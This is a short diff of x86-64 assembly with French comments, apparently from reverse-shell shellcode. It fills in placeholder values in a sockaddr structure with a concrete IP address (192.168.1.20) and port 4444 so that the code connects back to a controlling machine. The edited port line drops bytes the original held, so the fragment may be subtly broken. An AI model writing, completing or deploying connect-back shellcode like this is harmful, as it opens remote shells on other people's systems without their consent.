@@ -15,9 +15,9 @@ mov r12, rax    ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscal
 ; sockaddr 
 xor rbx, rbx    ; remise a zero de rbx
 push rbx        ; padding de 8
-mov rbx, 0x????????      ; @ ip machine little indian
+mov rbx, 0x1401a8c0      ; @ ip machine little indian
 push rbx
-mov rbx, 0x115c????
+mov rbx, 0x115c ; port 4444
 push rbx
 mov rsi,rsp     ; rsi = pointeur vers sockaddr
 
